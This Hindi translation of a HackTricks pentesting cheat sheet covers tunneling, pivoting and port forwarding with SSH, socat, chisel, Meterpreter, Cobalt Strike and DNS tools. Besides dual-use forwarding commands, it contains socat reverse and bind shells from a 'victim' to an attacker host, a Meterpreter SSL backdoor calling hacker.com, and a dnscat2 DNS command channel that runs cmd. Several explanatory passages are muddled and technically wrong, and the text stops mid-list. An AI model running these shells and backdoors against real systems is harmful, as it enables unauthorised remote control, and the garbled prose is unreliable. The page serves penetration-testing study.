# टनलिंग और पोर्ट फॉरवर्डिंग

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने का उपयोग करना है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा संग्रह अनन्य [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें** [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके।

</details>

## Nmap टिप

{% hint style="warning" %}
**ICMP** और **SYN** स्कैन को socks प्रॉक्सी के माध्यम से टनल नहीं किया जा सकता है, इसलिए हमें **पिंग खोज** (`-Pn`) को अक्षम करना होगा और इसके लिए **TCP स्कैन** (`-sT`) निर्दिष्ट करना होगा।
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH ग्राफिकल कनेक्शन (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### स्थानीय पोर्ट2पोर्ट

SSH सर्वर में नया पोर्ट खोलें --> अन्य पोर्ट
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### पोर्ट2पोर्ट

स्थानीय पोर्ट --> संकटग्रस्त होस्ट (SSH) --> तीसरा\_बॉक्स:पोर्ट
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

स्थानीय पोर्ट --> संकटग्रस्त होस्ट (SSH) --> कहीं भी
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### रिवर्स पोर्ट फॉरवर्डिंग

यह आपके होस्ट के माध्यम से एक DMZ के माध्यम से आंतरिक होस्ट से रिवर्स शैल्स प्राप्त करने के लिए उपयोगी है:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

आपको **दोनों उपकरणों में रूट अनुमति** की आवश्यकता होती है (क्योंकि आप नए इंटरफेस बना रहे हैं) और sshd कॉन्फ़िगरेशन को रूट लॉगिन की अनुमति देनी होगी:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
सर्वर साइड पर फ़ॉरवर्डिंग सक्षम करें
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
ग्राहक की ओर से एक नया मार्ग सेट करें
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

आप एक मेजबान के माध्यम से एक सबनेटवर्क के सभी ट्रैफिक को ssh के माध्यम से **टनल** कर सकते हैं।\
उदाहरण के लिए, 10.10.10.0/24 को जाने वाले सभी ट्रैफिक को आगे भेजना।
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
एक निजी कुंजी के साथ कनेक्ट करें
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### पोर्ट2पोर्ट

स्थानीय पोर्ट --> संकटग्रस्त होस्ट (सक्रिय सत्र) --> तीसरा\_बॉक्स:पोर्ट
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
SOCKS (Socket Secure) एक नेटवर्क प्रोटोकॉल है जो ट्रांसपोर्ट लेयर पर काम करता है और इंटरनेट कनेक्शन को टनल करने की सुविधा प्रदान करता है। SOCKS का उपयोग नेटवर्क ट्रैफिक को एक अन्य मध्यस्थ या प्रोक्सी सर्वर के माध्यम से पाठित करने के लिए किया जाता है। यह एक विदेशी नेटवर्क तक पहुंच प्रदान करने के लिए उपयोगी हो सकता है और इंटरनेट गतिविधि को गोपनीय रखने में मदद कर सकता है।

SOCKS का उपयोग करके, आप अपने सिस्टम को एक अन्य सिस्टम के लिए टनल कर सकते हैं और उस सिस्टम के द्वारा इंटरनेट गतिविधि को क्रिप्ट कर सकते हैं। इसके लिए, आपको एक SOCKS सर्वर को सेटअप करना होगा और उसे अपने सिस्टम के लिए एक प्रॉक्सी सर्वर के रूप में कॉन्फ़िगर करना होगा। फिर, आप अपने सिस्टम के द्वारा इंटरनेट गतिविधि को टनल करने के लिए इस SOCKS प्रॉक्सी सर्वर का उपयोग कर सकते हैं।

एक बार जब आपका टनल स्थापित हो जाता है, आप अन्य सिस्टमों तक पहुंच प्राप्त कर सकते हैं और उनके साथ नेटवर्क संचार कर सकते हैं। यह आपको अनुप्रयोगों को टेस्ट करने, नेटवर्क ट्रैफिक को मॉनिटर करने और अन्य नेटवर्क गतिविधियों को अनुकरण करने की अनुमति देता है।

ध्यान दें कि SOCKS केवल ट्रांसपोर्ट लेयर पर काम करता है और इंटरनेट प्रोटोकॉलों को क्रिप्ट नहीं करता है। इसलिए, आपको अपनी गोपनीयता की रक्षा के लिए अन्य सुरक्षा उपायों का उपयोग करना चाहिए, जैसे कि VPN या SSL/TLS टनलिंग।
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
एक और तरीका:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS प्रॉक्सी

टीमसर्वर में एक पोर्ट खोलें जो सभी इंटरफेस में सुन रहा हो और जिसका उपयोग बीकन के माध्यम से ट्रैफिक को रूट करने के लिए किया जा सके।
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
इस मामले में, **पोर्ट बीकन होस्ट में खोला जाता है**, टीम सर्वर में नहीं, और यात्रा टीम सर्वर के माध्यम से निर्दिष्ट होस्ट:पोर्ट को भेजी जाती है।
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
ध्यान दें:

* बीकन का रिवर्स पोर्ट फ़ॉरवर्ड हमेशा ट्राफिक को टीम सर्वर के लिए टनल करता है और टीम सर्वर ट्राफिक को इसके इंटेंडेड डेस्टिनेशन पर भेजता है, इसलिए इंडिविजुअल मशीनों के बीच ट्राफिक को रिले करने के लिए उपयोग नहीं किया जाना चाहिए।
* ट्राफिक बीकन के सी 2 ट्राफिक के अंदर टनल किया जाता है, अलग-अलग सॉकेट्स पर नहीं, और यह P2P लिंकों पर भी काम करता है।
* उच्च पोर्ट पर रिवर्स पोर्ट फ़ॉरवर्ड बनाने के लिए आपको स्थानीय एडमिन होने की आवश्यकता नहीं होती है।

### स्थानीय rPort2Port

{% hint style="warning" %}
इस मामले में, पोर्ट बीकन होस्ट में खोला जाता है, टीम सर्वर में नहीं, और ट्राफिक को कोबाल्ट स्ट्राइक क्लाइंट (टीम सर्वर को नहीं) को भेजा जाता है और वहां से निर्दिष्ट होस्ट: पोर्ट पर भेजा जाता है।
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

आपको एक वेब फ़ाइल टनल अपलोड करने की आवश्यकता होती है: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## चिज़ल

आप इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) के रिलीज़ पेज से डाउनलोड कर सकते हैं।\
आपको **क्लाइंट और सर्वर के लिए एक ही संस्करण का उपयोग करना होगा**

### सॉक्स
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### पोर्ट फ़ोरवर्डिंग

Port forwarding (पोर्ट फ़ोरवर्डिंग) एक तकनीक है जिसका उपयोग नेटवर्क ट्रैफ़िक को एक नेटवर्क इंटरफ़ेस से दूसरे इंटरफ़ेस पर प्रेषित करने के लिए किया जाता है। यह एक उपयोगी तकनीक है जो नेटवर्क सुरक्षा, नेटवर्क परीक्षण और दूरस्थ पहुंच के लिए उपयोगी हो सकती है।

जब आप पोर्ट फ़ोरवर्डिंग का उपयोग करते हैं, तो आप एक निर्दिष्ट पोर्ट के ट्रैफ़िक को एक निर्दिष्ट IP और पोर्ट पर भेज सकते हैं। इसका मतलब है कि आप एक उदाहरण के लिए एक दूसरे सिस्टम के लिए उपयोग होने वाले पोर्ट को अपने सिस्टम पर फ़ोरवर्ड कर सकते हैं।

यह तकनीक एक नेटवर्क इंटरफ़ेस को दूसरे इंटरफ़ेस पर जोड़ने के लिए उपयोगी हो सकती है, जिससे आप एक दूसरे सिस्टम के साथ संचार कर सकते हैं जो आपके नेटवर्क के बाहर है। इसके लिए, आपको एक निर्दिष्ट पोर्ट पर ट्रैफ़िक को अपने सिस्टम पर फ़ोरवर्ड करने के लिए एक निर्दिष्ट IP और पोर्ट का उपयोग करना होगा।

यह तकनीक नेटवर्क परीक्षण के दौरान बहुत उपयोगी हो सकती है, क्योंकि इससे आप एक दूसरे सिस्टम के साथ संचार कर सकते हैं जो आपके नेटवर्क के बाहर है, और इसे उपयोग करके आप नेटवर्क की सुरक्षा को जांच सकते हैं।
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

रिवर्स टनल। टनल विक्टिम से शुरू होता है।
127.0.0.1:1080 पर एक socks4 प्रॉक्सी बनाई जाती है।
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM प्रॉक्सी** के माध्यम से पिवट करें
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### बाइंड शेल
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### रिवर्स शेल

एक रिवर्स शेल एक हैकर को एक दूसरे सिस्टम में दूरस्थ रूप से एक कमांड इंटरप्रिटर का उपयोग करने की अनुमति देता है। यह एक प्रकार का टनलिंग है जिसमें एक होस्ट उपयोगकर्ता एक दूसरे होस्ट पर एक कमांड इंटरप्रिटर शुरू करता है। रिवर्स शेल का उपयोग एक हैकर को दूसरे सिस्टम में गहरे स्तर के नियंत्रण की पहुंच प्रदान करने के लिए किया जाता है। यह एक प्रभावी तकनीक है जो एक हैकर को निश्चित सिस्टम पर अनधिकृत रूप से प्रवेश करने की अनुमति देती है।

एक रिवर्स शेल स्थापित करने के लिए, हैकर एक शिकार के सिस्टम में एक ट्रोजन या अन्य अनधिकृत सॉफ़्टवेयर को स्थापित करता है। यह सॉफ़्टवेयर एक निश्चित पोर्ट पर एक कमांड इंटरप्रिटर शुरू करता है और एक निश्चित सर्वर पर इसकी प्रतिक्रिया भेजता है। हैकर फिर उस सर्वर के माध्यम से शिकार के सिस्टम में एक कमांड इंटरप्रिटर के साथ संपर्क स्थापित करता है। इसके बाद, हैकर उस सिस्टम पर विभिन्न कमांड्स को निष्पादित कर सकता है और उसके लिए नियंत्रण प्राप्त कर सकता है।

रिवर्स शेल एक प्रभावी तकनीक है जो हैकर को निश्चित सिस्टम पर गहरे स्तर के नियंत्रण की पहुंच प्रदान करती है। यह एक प्रभावी तरीका है जिसका उपयोग नेटवर्क पेंटेस्टिंग और सिस्टम हैकिंग में किया जाता है।
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### पोर्ट2पोर्ट

Port2Port एक टनलिंग तकनीक है जिसका उपयोग नेटवर्क कनेक्शन को एक पोर्ट से दूसरे पोर्ट पर पुनर्निर्देशित करने के लिए किया जाता है। यह तकनीक एक नेटवर्क डिवाइस को एक अन्य नेटवर्क डिवाइस के साथ संचार करने की अनुमति देती है, जो वाणिज्यिक और सुरक्षा उद्देश्यों के लिए उपयोगी हो सकता है।

इस तकनीक का उपयोग एक आउटसाइडर को आपके नेटवर्क में एक्सेस प्रदान करने के लिए भी किया जा सकता है, जिससे उन्हें आपके सिस्टम और सेवाओं तक पहुंच मिलती है। इसके लिए, आपको एक टनल बनाने के लिए एक आउटगोइंग नेटवर्क कनेक्शन को एक इनकमिंग कनेक्शन के साथ जोड़ना होगा।

एक प्रमुख उदाहरण पोर्ट2पोर्ट तकनीक का है SSH पोर्ट फ़ॉरवर्डिंग, जहां एक आउटसाइडर एक्सेस के लिए आपके सिस्टम के एक निर्दिष्ट पोर्ट पर कनेक्ट होता है और आपके सिस्टम उसे एक अन्य पोर्ट पर पुनर्निर्देशित करता है जहां आपकी सेवा सुनिश्चित रूप से सुरक्षित रहती है।

इसके अलावा, अन्य टनलिंग तकनीकों में शामिल हैं Reverse SSH Tunneling, Local Port Forwarding, Remote Port Forwarding, और Dynamic Port Forwarding। ये सभी तकनीकें नेटवर्क कनेक्शन को एक पोर्ट से दूसरे पोर्ट पर पुनर्निर्देशित करने के लिए उपयोगी होती हैं।
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### सॉक्स के माध्यम से पोर्ट से पोर्ट टनलिंग

एक साधारण तरीका पोर्ट टनलिंग के लिए सॉक्स (socks) प्रोटोकॉल का उपयोग करना है। सॉक्स प्रोटोकॉल एक नेटवर्क प्रोटोकॉल है जो नेटवर्क ट्राफिक को टनल करने की अनुमति देता है। इसका उपयोग करके, हम एक स्थानीय पोर्ट को एक दूसरे स्थानीय पोर्ट पर टनल कर सकते हैं।

इसके लिए, हमें एक सॉक्स सर्वर की आवश्यकता होती है जिसे हम लोकली होस्ट पर चला सकते हैं। फिर हम एक सॉक्स क्लाइंट को उपयोग करके इस सर्वर के साथ कनेक्ट करते हैं। इसके बाद, हम एक टनल बना सकते हैं जिसमें हम एक स्थानीय पोर्ट को एक दूसरे स्थानीय पोर्ट पर फ़ॉरवर्ड कर सकते हैं।

यहां एक उदाहरण है कि कैसे हम एक स्थानीय पोर्ट 8080 को एक दूसरे स्थानीय पोर्ट 8888 पर टनल कर सकते हैं:

```
ssh -D 8888 user@socks_server_ip
```

इसके बाद, हम एक अन्य टर्मिनल में निम्नलिखित कमांड का उपयोग करके टनल बना सकते हैं:

```
ssh -L 8080:localhost:8888 user@localhost
```

इसके बाद, हमारा स्थानीय पोर्ट 8080 अब स्थानीय पोर्ट 8888 पर फ़ॉरवर्ड होगा। इसका अर्थ है कि हम अब लोकल मशीन पर पोर्ट 8888 पर चल रहे सेवा तक पहुंच सकते हैं, जो वास्तविकता में स्थानीय पोर्ट 8080 पर चल रही है।
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL सोकैट के माध्यम से मीटरप्रेटर

यह तकनीक मीटरप्रेटर को SSL सोकैट के माध्यम से टनल करने के लिए है। इसका उपयोग नेटवर्क पर डेटा को सुरक्षित ढंग से ट्रांसफर करने के लिए किया जाता है। यह तकनीक एक उदाहरण के रूप में उबंटू लिनक्स पर दिखाया गया है, लेकिन इसे अन्य ऑपरेटिंग सिस्टम पर भी उपयोग किया जा सकता है।

यहां चरणों की सूची है:

1. सबसे पहले, आपको सर्वर पर SSL सर्टिफिकेट तैयार करना होगा। आप इसे खरीद सकते हैं या खुद तैयार कर सकते हैं।

2. अगला कदम है सर्वर पर सोकैट सुनने के लिए एक स्क्रिप्ट चलाना। आप इसे निम्नलिखित कमांड के माध्यम से कर सकते हैं:

   ```
   socat openssl-listen:443,reuseaddr,cert=/path/to/certificate.pem,verify=0,fork tcp-listen:4444
   ```

   यहां, 443 पोर्ट पर सोकैट सुन रहा है और 4444 पोर्ट पर TCP सोकेट को फ़ॉर्क कर रहा है। सर्टिफिकेट की जगह, अपने सर्टिफिकेट फ़ाइल का पथ दर्ज करें।

3. अब, आपको अपने टारगेट मशीन पर मीटरप्रेटर स्थापित करना होगा। आप निम्नलिखित कमांड का उपयोग करके इसे कर सकते हैं:

   ```
   meterpreter > use exploit/multi/handler
   meterpreter > set payload windows/meterpreter/reverse_tcp
   meterpreter > set LHOST <your_local_ip>
   meterpreter > set LPORT 4444
   meterpreter > set ExitOnSession false
   meterpreter > exploit -j
   ```

   यहां, `<your_local_ip>` की जगह, अपने स्थानीय IP पता दर्ज करें।

4. अंत में, आपको टनल को स्थापित करने के लिए निम्नलिखित कमांड का उपयोग करना होगा:

   ```
   socat openssl-connect:<target_ip>:443,verify=0 exec:"cmd.exe",pty,stderr,setsid,sigint,sane
   ```

   यहां, `<target_ip>` की जगह, आपके लक्ष्य के IP पते को दर्ज करें।

इसके बाद, आपको मीटरप्रेटर के साथ टनल का उपयोग करके टारगेट मशीन पर नियंत्रण प्राप्त करने की क्षमता होगी।
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
आप विक्टिम की कंसोल में अंतिम लाइन की बजाय इस लाइन को निष्क्रिय करके **गैर प्रमाणित प्रॉक्सी** को अनदेखा कर सकते हैं:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat टनल

**/bin/sh कंसोल**

दोनों ओर: क्लाइंट और सर्वर पर प्रमाणपत्र बनाएं
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### रिमोट पोर्ट2पोर्ट

लोकल SSH पोर्ट (22) को हमलावर होस्ट के 443 पोर्ट से कनेक्ट करें
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

यह कॉन्सोल PuTTY की तरह है (विकल्प एक ssh क्लाइंट के बहुत ही समान हैं।)

जैसा कि यह बाइनरी विक्टिम में निष्पादित किया जाएगा और यह एक ssh क्लाइंट है, हमें अपनी ssh सेवा और पोर्ट खोलने की आवश्यकता होती है ताकि हमें एक रिवर्स कनेक्शन हो सके। फिर, केवल स्थानीय रूप से पहुंचने योग्य पोर्ट को हमारी मशीन में एक पोर्ट पर फ़ॉरवर्ड करने के लिए:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### पोर्ट2पोर्ट

आपको स्थानीय व्यवस्थापक होना चाहिए (किसी भी पोर्ट के लिए)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP और Proxifier

आपको **सिस्टम पर RDP एक्सेस** होना चाहिए।\
डाउनलोड करें:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह टूल `Windows` की `Remote Desktop Service` फ़ीचर के `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **RDP कनेक्शन के माध्यम से पैकेट्स को टनल करने के लिए जिम्मेदार होता है**।
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

अपने क्लाइंट कंप्यूटर में इस तरह से **`SocksOverRDP-Plugin.dll`** लोड करें:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
अब हम **RDP** का उपयोग करके **पीड़ित** के साथ **कनेक्ट** कर सकते हैं, **`mstsc.exe`** का उपयोग करके, और हमें एक **प्रॉम्प्ट** प्राप्त होना चाहिए जिसमें कहा जाएगा कि **SocksOverRDP प्लगइन सक्षम है**, और यह **127.0.0.1:1080** पर **सुनेगा**।

**RDP** के माध्यम से **कनेक्ट** करें और पीड़ित मशीन में **`SocksOverRDP-Server.exe`** बाइनरी अपलोड और निष्पादित करें:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
अब, अपनी मशीन (हमलावर) में पुष्टि करें कि पोर्ट 1080 सुन रहा है:
```
netstat -antb | findstr 1080
```
अब आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके **उस पोर्ट के माध्यम से ट्रैफिक को प्रॉक्सी कर सकते हैं।**

## Windows GUI Apps को प्रॉक्सीफ़ाय करें

आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके Windows GUI Apps को प्रॉक्सी के माध्यम से नेविगेट कर सकते हैं।\
**Profile -> Proxy Servers** में SOCKS सर्वर का IP और पोर्ट जोड़ें।\
**Profile -> Proxification Rules** में प्रॉक्सीफ़ाय करने के लिए प्रोग्राम का नाम और आप जिन IPs को प्रॉक्सीफ़ाय करना चाहते हैं, उनके साथ कनेक्शन जोड़ें।

## NTLM प्रॉक्सी बाईपास

पहले उल्लिखित उपकरण: **Rpivot**\
**OpenVPN** भी इसे बाईपास कर सकता है, कॉन्फ़िगरेशन फ़ाइल में निम्नलिखित विकल्प सेट करके:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

यह प्रॉक्सी के खिलाफ प्रमाणित करता है और एक स्थानीय बंधन बाइंड करता है जो आपके द्वारा निर्दिष्ट बाह्य सेवा को आगे भेजा जाता है। फिर, आप इस पोर्ट के माध्यम से अपनी पसंदीदा टूल का उपयोग कर सकते हैं।\
उदाहरण के लिए, यह पोर्ट 443 को आगे भेजता है।
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
अब, यदि आप उदाहरण के रूप में पीड़ित में **SSH** सेवा को पोर्ट 443 में सुनने के लिए सेट करते हैं। आप इसे हमलावर पोर्ट 2222 के माध्यम से कनेक्ट कर सकते हैं।\
आप एक **मीटरप्रीटर** भी उपयोग कर सकते हैं जो localhost:443 से कनेक्ट करता है और हमलावर पोर्ट 2222 में सुन रहा है।

## YARP

Microsoft द्वारा बनाए गए एक रिवर्स प्रॉक्सी। आप इसे यहां पा सकते हैं: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

टन एडाप्टर बनाने और DNS क्वेरी का उपयोग करके उन्हें टनल डेटा करने के लिए दोनों सिस्टम में रूट की आवश्यकता होती है।
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
टनल बहुत धीमा होगा। आप इस टनल के माध्यम से एक संपीड़ित SSH कनेक्शन बना सकते हैं इसका उपयोग करके:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

****[**यहां से इसे डाउनलोड करें**](https://github.com/iagox86/dnscat2)**.**

DNS के माध्यम से एक सीएंडसी चैनल स्थापित करता है। इसे रूट अधिकार नहीं चाहिए।
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **पावरशेल में**

आप [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग करके पावरशेल में dnscat2 क्लाइंट चला सकते हैं:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **डीएनएसकैट के साथ पोर्ट फ़ॉरवर्डिंग**

Port forwarding is a technique used to redirect network traffic from one port on a host to another port on a different host. It is commonly used in situations where direct communication between two hosts is not possible due to network restrictions or firewall rules.

Dnscat is a tool that allows you to create a covert communication channel by encapsulating data within DNS queries and responses. It can be used for various purposes, including bypassing network restrictions and exfiltrating data from a target network.

To perform port forwarding with dnscat, you need to set up a DNS server that will act as a proxy between the client and the target host. The DNS server will intercept DNS queries and responses, extract the encapsulated data, and forward it to the appropriate destination.

Here are the steps to set up port forwarding with dnscat:

1. Install and configure dnscat on both the client and the target host.
2. Set up a DNS server that will act as a proxy.
